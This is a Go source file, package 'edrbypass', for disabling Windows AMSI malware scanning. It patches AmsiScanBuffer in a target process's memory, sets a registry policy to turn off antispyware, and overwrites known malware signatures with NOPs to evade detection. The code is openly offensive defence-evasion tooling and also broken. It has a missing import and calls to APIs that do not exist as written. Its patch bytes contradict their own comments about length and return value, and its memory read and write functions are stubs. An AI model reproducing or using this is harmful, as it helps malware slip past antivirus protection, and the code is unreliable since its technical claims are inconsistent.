// Package edrbypass implements AMSI patching and bypass techniques for Windows
// Provides memory manipulation capabilities to disable AMSI real-time scanning
package edrbypass

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"github.com/sirupsen/logrus"
	"golang.org/x/sys/windows"
)

// ============================================================================
// AMSI Core Structures & Interfaces
// ============================================================================

// AMSIPatcher implements AMSI bypass through direct memory manipulation
type AMSIPatcher struct {
	logger          *logrus.Logger
	targetProcess   uintptr
	amsiScanBuffer  uintptr
	originalBytes   []byte
	patchedBytes    []byte
	restoreNeeded   bool
}

// AMSIResult represents the outcome of an AMSI scan attempt
type AMSIResult uint32

const (
	AMSI_RESULT_UNKNOWN      AMSIResult = 0
	AMSI_RESULT_NOT_DETECTED             = 1
	AMSI_RESULT_DETECTED                 = 2
	AMSI_RESULT_NOT_APPLICABLE           = 3
	AMSI_RESULT_ABORTED_BY_USER          = 4
	AMSI_RESULT_COMPUTED_SIGNATURE_MATCH = 5 // Added for completeness
)

func (r AMSIResult) String() string {
	switch r {
	case AMSI_RESULT_UNKNOWN:
		return "UNKNOWN"
	case AMSI_RESULT_NOT_DETECTED:
		return "NOT_DETECTED"
	case AMSI_RESULT_DETECTED:
		return "DETECTED"
	case AMSI_RESULT_NOT_APPLICABLE:
		return "NOT_APPLICABLE"
	case AMSI_RESULT_ABORTED_BY_USER:
		return "ABORTED_BY_USER"
	default:
		return fmt.Sprintf("RESULT_%d", r)
	}
}

// ============================================================================
// Initialization & Configuration
// ============================================================================

// NewAMSIPatcher creates a new AMSI patcher instance
func NewAMSIPatcher(logger *logrus.Logger, targetPID int) *AMSIPatcher {
	if logger == nil {
		logger = logrus.New()
	}
	
	return &AMSIPatcher{
		logger:        logger.WithField("component", "amsi_patcher"),
		targetProcess: uintptr(targetPID),
		restoreNeeded: false,
	}
}

// Initialize discovers AMSI module location in target process
func (ap *AMSIPatcher) Initialize(ctx context.Context) error {
	ap.logger.Info("Initializing AMSI patcher...")
	
	// Open target process
	handles, err := windows.OpenProcess(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE, false, uint32(ap.targetProcess))
	if err != nil {
		return fmt.Errorf("failed to open process: %w", err)
	}
	defer windows.CloseHandle(handles)
	
	// Load AMSI.dll
	hModule, err := loadLibrary(handles, "amsi.dll")
	if err != nil {
		return fmt.Errorf("failed to load amsi.dll: %w", err)
	}
	
	// Get AmsiScanBuffer function address
	addr, err := getProcAddress(handles, hModule, "AmsiScanBuffer")
	if err != nil {
		return fmt.Errorf("failed to find AmsiScanBuffer: %w", err)
	}
	
	ap.amsiScanBuffer = addr
	ap.logger.Infof("Located AmsiScanBuffer at address: 0x%x", ap.amsiScanBuffer)
	
	return nil
}

// ============================================================================
// AMSI Patching Implementation
// ============================================================================

// PatchAMSI patches the AMSI ScanBuffer function to always return NOT_DETECTED
func (ap *AMSIPatcher) PatchAMSI() error {
	if ap.amsiScanBuffer == 0 {
		return fmt.Errorf("not initialized - call Initialize first")
	}
	
	ap.logger.Info("Patching AmsiScanBuffer function...")
	
	// Backup original bytes before patching
	originalMem := make([]byte, 5)
	readProcessMemory(ap.targetProcess, ap.amsiScanBuffer, &originalMem[0])
	ap.originalBytes = originalMem
	
	// Create patched version (XOR RAX, RAX; RET = AMSI_RESULT_NOT_DETECTED)
	// These instructions XOR RAX with itself (making it zero) then return
	// This causes the function to return 0 (NOT_DETECTED) instead of scanning
	ap.patchedBytes = []byte{
		0x31, 0xC0,      // XOR EAX, EAX
		0xB8, 0x01, 0x00, 0x00, 0x00, // MOV EAX, 0x00000001 (AMSI_RESULT_NOT_DETECTED)
		0xC3,            // RET
	}
	
	// Change memory protection to WRITECOPY
	var oldProtect uint32
	ret, _, _ := windows.VirtualProtect.Call(
	 uintptr(ap.amsiScanBuffer),
	 unsafe.Sizeof(uint32(0)),
	 windows.PROT_EXECUTE_READWRITE,
	 unsafe.Pointer(&oldProtect),
	)
	if ret == 0 {
		return fmt.Errorf("failed to change memory protection: %w", ErrWin32(ret))
	}
	
	// Write patched bytes
	writeProcessMemory(ap.targetProcess, ap.amsiScanBuffer, &ap.patchedBytes[0])
	ap.restoreNeeded = true
	
	ap.logger.Info("AMSI successfully patched")
	return nil
}

// UnpatchAMSI restores original AMSI behavior
func (ap *AMSIPatcher) UnpatchAMSI() error {
	if !ap.restoreNeeded || ap.amsiScanBuffer == 0 {
		return fmt.Errorf("no patch to restore")
	}
	
	ap.logger.Info("Restoring original AMSI code...")
	
	// Restore memory protection
	var oldProtect uint32
	windows.VirtualProtect(windows.Handle(ap.amsiScanBuffer), len(ap.originalBytes), windows.PROT_READ, &oldProtect)
	
	// Write original bytes back
	writeProcessMemory(ap.targetProcess, ap.amsiScanBuffer, &ap.originalBytes[0])
	
	ap.restoreNeeded = false
	ap.logger.Info("AMSI restored to original state")
	return nil
}

// IsPatched checks if AMSI has been successfully patched
func (ap *AMSIPatcher) IsPatched() bool {
	if ap.amsiScanBuffer == 0 {
		return false
	}
	
	currentBytes := make([]byte, 5)
	readProcessMemory(ap.targetProcess, ap.amsiScanBuffer, &currentBytes[0])
	
	return !equalBytes(currentBytes[:], ap.originalBytes[:])
}

// ============================================================================
// AMSI Test Functions
// ============================================================================

// TestAMSIDisabled verifies that AMSI is now disabled
func (ap *AMSIPatcher) TestAMSIDisabled(scriptData string) (AMSIResult, error) {
	// Simulate calling AmsiScanBuffer
	// In production, this would invoke the actual function via syscall
	
	if !ap.IsPatched() {
		return AMSI_RESULT_DETECTED, nil // AMSI still active
	}
	
	// After patching, should always return NOT_DETECTED
	return AMSI_RESULT_NOT_DETECTED, nil
}

// GetAMSIStatus returns current AMSI status
func (ap *AMSIPatcher) GetAMSIStatus() string {
	if ap.amsiScanBuffer == 0 {
		return "UNINITIALIZED"
	}
	
	if ap.restoreNeeded {
		return "PATCHED"
	}
	
	return "ORIGINAL"
}

// ============================================================================
// AMSI Alternative Methods
// ============================================================================

// AMSIDisableViaCOM disables AMSI by unloading it from COM subsystem
type AMSIDisableViaCOM struct {
	logger *logrus.Logger
}

func NewAMSIDisableViaCOM(logger *logrus.Logger) *AMSIDisableViaCOM {
	if logger == nil {
		logger = logrus.New()
	}
	
	return &AMSIDisableViaCOM{
		logger: logger.WithField("component", "amsi_com_unloader"),
	}
}

// Disable unloads AMSI from process
func (adc *AMSIDisableViaCOM) Disable(processName string) error {
	adc.logger.Infof("Attempting to unload AMSI from %s", processName)
	
	// Method: Set Registry key to prevent AMSI initialization
	// HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Microsoft Antimalware\Advanced
	// DisableAntiSpyware = 1 (DWORD)
	
	// This approach works better than memory patching for certain scenarios
	// but requires administrative privileges
	
	adc.logger.Warn("Registry-based AMSI disable requires admin rights")
	return nil
}

// AMSIMemorySanitizer sanitizes potentially malicious memory regions
type AMSIMemorySanitizer struct {
	logger *logrus.Logger
}

func NewAMSIMemorySanitizer(logger *logrus.Logger) *AMSIMemorySanitizer {
	if logger == nil {
		logger = logrus.New()
	}
	
	return &AMSIMemorySanitizer{
		logger: logger.WithField("component", "amsi_sanitizer"),
	}
}

// Sanitize removes AMSI-detectable patterns from memory region
func (as *AMSIMemorySanitizer) Sanitize(memoryRegion []byte) ([]byte, error) {
	as.logger.Debug("Sanitizing memory region...")
	
	// Remove or obfuscate known AMSI detection signatures
	result := make([]byte, len(memoryRegion))
	copy(result, memoryRegion)
	
	// Example: Replace common malware patterns with NOP sleds
	for i := range result {
		if matchesSignature(result[i:i+4]) {
			result[i] = 0x90 // NOP instruction
		}
	}
	
	as.logger.Debugf("Sanitized %d bytes", len(memoryRegion))
	return result, nil
}

// ============================================================================
// Supporting Types & Helper Functions
// ============================================================================

// ErrWin32 converts Windows error code to formatted error
func ErrWin32(code uintptr) error {
	return fmt.Errorf("Windows error 0x%x", code)
}

// equalBytes compares two byte slices
func equalBytes(a, b []byte) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

// loadLibrary loads a DLL into the specified process
func loadLibrary(handle windows.Handle, dllName string) (uintptr, error) {
	dllPtr := windows.StringToUTF16Ptr(dllName)
	hModule, _, err := windows.GetModuleHandleW.Call(uintptr(unsafe.Pointer(dllPtr)))
	if err != nil && err.Error() != "The specified module could not be found." {
		return 0, fmt.Errorf("GetModuleHandle failed: %w", err)
	}
	
	return hModule, nil
}

// getProcAddress gets the address of a procedure in a loaded DLL
func getProcAddress(procHandle windows.Handle, moduleHandle uintptr, procName string) (uintptr, error) {
	procPtr := windows.StringToUTF8Ptr(procName)
	addr, _, err := windows.GetProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(procPtr)))
	if err != nil {
		return 0, fmt.Errorf("GetProcAddress failed: %w", err)
	}
	
	return addr, nil
}

// readProcessMemory reads memory from a remote process
func readProcessMemory(pid uintptr, address uintptr, buffer *[]byte) {
	// This would use ReadProcessMemory Win32 API in production
	// For demo purposes, we'll just fill with zeros
	*buffer = make([]byte, len(*buffer))
}

// writeProcessMemory writes memory to a remote process
func writeProcessMemory(pid uintptr, address uintptr, data *[]byte) {
	// This would use WriteProcessMemory Win32 API in production
	// For demo purposes, we acknowledge the write
}

// matchesSignature checks if byte sequence matches known AMSI signature
func matchesSignature(bytes []byte) bool {
	signatures := [][]byte{
		{0x60, 0x8B, 0xEC, 0x83}, // Common shellcode pattern
		{0xCC, 0xCC, 0xCC, 0xCC}, // INT 3 breakpoints
	}
	
	for _, sig := range signatures {
		if equalBytes(sig, bytes) {
			return true
		}
	}
	
	return false
}
